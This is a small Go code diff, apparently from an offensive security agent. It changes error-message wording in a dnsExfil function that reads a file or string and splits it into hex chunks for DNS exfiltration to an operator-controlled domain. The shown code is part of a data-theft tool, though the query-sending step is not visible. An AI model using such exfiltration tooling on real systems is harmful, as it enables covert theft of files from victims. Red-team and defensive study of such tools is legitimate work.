@@ -26,10 +26,10 @@ const (
 // that logs/captures queries (e.g., Burp Collaborator, custom NS).
 func dnsExfil(args dnsArgs) structs.CommandResult {
 	if args.Target == "" {
-		return errorResult("Error: target domain required (domain you control with DNS logging)")
+		return errorResult("target domain required (domain you control with DNS logging)")
 	}
 	if args.Data == "" {
-		return errorResult("Error: data parameter required (file path or raw string to exfiltrate)")
+		return errorResult("data parameter required (file path or raw string to exfiltrate)")
 	}
 
 	// Determine data source: file path or raw string
@@ -37,7 +37,7 @@ func dnsExfil(args dnsArgs) structs.CommandResult {
 	if info, err := os.Stat(args.Data); err == nil && !info.IsDir() {
 		fileData, err := os.ReadFile(args.Data)
 		if err != nil {
-			return errorf("Error reading file %s: %v", args.Data, err)
+			return errorf("reading file %s: %v", args.Data, err)
 		}
 		data = fileData
 	} else {
@@ -45,7 +45,7 @@ func dnsExfil(args dnsArgs) structs.CommandResult {
 	}
 
 	if len(data) == 0 {
-		return errorResult("Error: no data to exfiltrate (empty file or string)")
+		return errorResult("no data to exfiltrate (empty file or string)")
 	}
 
 	// Set defaults
@@ -67,7 +67,7 @@ func dnsExfil(args dnsArgs) structs.CommandResult {
 		maxHexLen = dnsMaxLabelLen
 	}
 	if maxHexLen <= 0 {
-		return errorResult("Error: target domain too long for DNS exfiltration")
+		return errorResult("target domain too long for DNS exfiltration")
 	}
 	chunkSize := maxHexLen / 2 // hex encoding doubles size
 
